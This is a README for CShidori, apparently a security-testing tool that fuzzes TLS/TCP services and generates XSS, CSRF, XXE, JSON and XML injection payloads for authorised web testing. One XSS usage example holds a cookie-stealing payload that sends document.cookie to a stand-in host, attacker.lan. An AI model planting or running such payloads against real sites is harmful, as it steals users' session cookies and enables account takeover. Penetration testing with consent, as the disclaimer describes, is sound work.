# CShidori

**Get Data and Fuzz Your App**

![](Intro.png)

## Real life vulnerabilities discovered by this tool

* Open Redirect: 1
* IDOR: 1
* XSS: 1
* Application Data Leak: 2

## Disclaimer

Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.

## References

* OWASP Web Application Security Testing Guide: [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)

* Taisen: [Website](https://taisen.fr)

* CShidori is part of [SIMPLE project (french)](https://github.com/Aif4thah/SIMPLE)


## Fuzzer and Data

### Fuzzer

* TLS Sockets (including HTTPS and other SSL/TLS encapsulated protocols)
* TCP Sockets (TCP layer and OSI 5,6,7 protocols, including HTTP )

### Data Generation Modes 
* Mutation
* XSS
* JSON
* XML
* GET
* CSRF
* XXE
* MSTest
* Encoding
* List Generation

### Payloads

* Chars (default)
* Strings (default)
* DotNet
* Java
* C
* Angular
* JavaScript

## Mutation Fuzzing

### TLS sockets

put your request in a text file (for HTTPS use Zap/Burp "copy to file")

```powershell
.\CShidori.exe -m tls -o ..\testing\ZAP-Post-req.raw -i 127.0.0.1 -p 443
```

### TCP Sockets

put your request in a text file (for HTTP use Zap/Burp "copy to file")

```powershell
.\CShidori.exe -m tcp -o ..\testing\burp.req -i 127.0.0.1 -p 80
```
### go further with MultiThreading

Edit and execute the `Start-Fuzzing-Function.ps1` script

```powershell
. .\Start-Fuzzing-Function.ps1
Start-Fuzzing
```

## Data Generation

### Mutation

generate 5 mutation (chars and bitflip) for the value "test" :

```powershell
.\CShidori.exe -m mut -o 5 -p test -d Chars
```

### XSS / Injections

wrapp xss command to test multiples injections:

```powershell
.\CShidori.exe -m xss -p 'document.location=\"https://attacker.lan?c=\"+document.cookie'
```

### JSON

Inject java and general payloads in all parameters of a Json request

```powershell
.\CShidori.exe -m json -p ..\testing\test.json -d Java,Strings
```

### XML

Inject .NET payloads in all parameters of an XML request

```powershell
.\CShidori.exe -m xml -p ..\testing\exemple.xml -d DotNet
```

### GET

Inject default payloads in all GET parameters and tests parameters polution

```powershell
.\CShidori.exe -m get -p "?bar=foo&foo=bar"
```

### CSRF

Generate get and post CSRF exploits

```powershell
.\CShidori.exe -m csrf -o get -p http://target.lan -i "name1=value1&name2=value2"
.\CShidori.exe -m csrf -o post -p http://target.lan -i "name1=value1&name2=value2"

```

### XXE

Generate XXE payload

```powershell
.\CShidori.exe -m xxe
```
### MSTEST

Generate Test for Microsoft.VisualStudio.TestTools.UnitTesting (Beta)

```powershell
.\CShidori.exe -m mst -p 'function( \"value1\", 2, FUZZ)' -i FUZZ
```

### Encode

Encode your payload

```powershell
.\CShidori.exe -m enc -p "<script>alert(1)</script>"
```

### List Generation

Generate a payload list

```powershell
.\CShidori.exe -m gen -d Chars,Java
```

## Miscellaneous

### SOAP & XSD

Removed since you can perform it from Visual Studio:
- Merge all XSD files in WSDL file
- Right click on the project and select "Add Service Reference" -> "WCF" -> "enter localPath"
